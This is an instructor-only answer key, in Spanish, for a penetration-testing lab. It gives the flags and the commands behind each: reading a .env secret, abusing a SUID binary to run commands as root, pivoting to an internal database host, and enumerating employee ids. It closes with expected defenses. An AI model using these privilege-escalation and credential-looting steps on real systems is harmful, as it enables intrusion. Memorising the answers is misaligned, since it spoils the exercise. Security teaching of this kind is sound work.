# Solución — Laboratorio 08 (SOLO DOCENTE)

> No compartir con alumnos.

## Levantar
```bash
make setup && make lab N=08 && make shell-victima    # caés como 'operador'
```

## Flags (todo desde el host víctima como operador)

| Reto | Flag | Cómo |
|---|---|---|
| R1 | `FLAG{post_situational_awareness}` | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` |
| R2 | `FLAG{loot_credentials_found}` | `cat /var/www/.env` (clave `APP_SECRET`) |
| R3 | `FLAG{privesc_suid_root}` | `find / -perm -4000 -type f 2>/dev/null` → `/usr/local/bin/system-check`; `system-check -p -c 'cat /root/flag.txt'` |
| R4 | `FLAG{pivot_internal_host}` | `curl -s http://phantomcorp-db/` (solo alcanzable desde la víctima) |
| R5 | `FLAG{automation_pays_off}` | loop sobre `/empleado?id=N` (1..250); el flag está en `id=187` |

## Verificación de la segmentación
Desde el atacante, `curl -m3 http://phantomcorp-db/` debe **fallar** (no está en
`internalnet`). Desde la víctima, funciona. Eso es el pivoting.

## recolector.py (referencia de la solución de buscar_flag)
```python
def buscar_flag(base, desde, hasta):
    for i in range(desde, hasta + 1):
        d = consultar_legajo(base, i)
        if d and "legajo_oculto" in d:
            return i, d["legajo_oculto"]
    return None
```
(El id mágico es 187, pero el script no debe hardcodearlo: debe encontrarlo.)

## Defensas esperadas
- SUID → quitar el bit, no copiar binarios con shell; auditar con `find -perm -4000`.
- Pivoting → segmentación estricta + firewall este-oeste; el web server no debería
  hablar con la DB salvo por el puerto/protocolo mínimo.
- Loot → no versionar `.env`, secretos en un vault, limpiar history.
